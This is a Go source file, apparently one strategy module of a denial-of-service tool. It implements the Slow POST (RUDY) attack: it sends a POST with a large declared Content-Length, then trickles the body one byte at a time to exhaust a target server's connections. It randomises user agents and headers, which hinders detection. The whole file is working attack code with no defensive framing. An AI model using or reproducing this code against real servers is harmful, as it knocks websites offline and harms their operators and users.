package strategy

import (
	"context"
	"math/rand"
	"sync/atomic"
	"time"
)

// SlowPost implements the Slow POST (RUDY) attack.
// It sends POST request with large Content-Length but transmits body very slowly,
// one byte at a time, to occupy server connections.
type SlowPost struct {
	sendInterval     time.Duration
	contentLength    int
	connConfig       ConnConfig
	headerRandomizer *HeaderRandomizer
	userAgents       []string
	activeConnections int64
}

func NewSlowPost(sendInterval time.Duration, contentLength int, bindIP string) *SlowPost {
	return &SlowPost{
		sendInterval:     sendInterval,
		contentLength:    contentLength,
		connConfig:       DefaultConnConfig(bindIP),
		headerRandomizer: DefaultHeaderRandomizer(),
		userAgents:       defaultUserAgents,
	}
}

func (s *SlowPost) Execute(ctx context.Context, target Target) error {
	mc, parsedURL, err := DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]

	// Build POST request with large Content-Length
	postRequest := s.headerRandomizer.BuildPOSTRequest(
		parsedURL,
		userAgent,
		s.contentLength,
		"application/x-www-form-urlencoded",
	)

	if _, err := mc.WriteWithTimeout([]byte(postRequest), 5*time.Second); err != nil {
		return err
	}

	ticker := time.NewTicker(s.sendInterval)
	defer ticker.Stop()

	bytesSent := 0
	bodyChars := "abcdefghijklmnopqrstuvwxyz0123456789"

	for {
		select {
		case <-mc.Context().Done():
			return nil
		case <-ticker.C:
			if bytesSent >= s.contentLength {
				// Reset and start new request
				bytesSent = 0
				if _, err := mc.WriteWithTimeout([]byte(postRequest), 5*time.Second); err != nil {
					return err
				}
				continue
			}

			// Send single byte of body
			bodyByte := bodyChars[rand.Intn(len(bodyChars))]
			if _, err := mc.WriteWithTimeout([]byte{byte(bodyByte)}, 5*time.Second); err != nil {
				return err
			}
			bytesSent++
		}
	}
}

func (s *SlowPost) Name() string {
	return "slow-post"
}

func (s *SlowPost) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
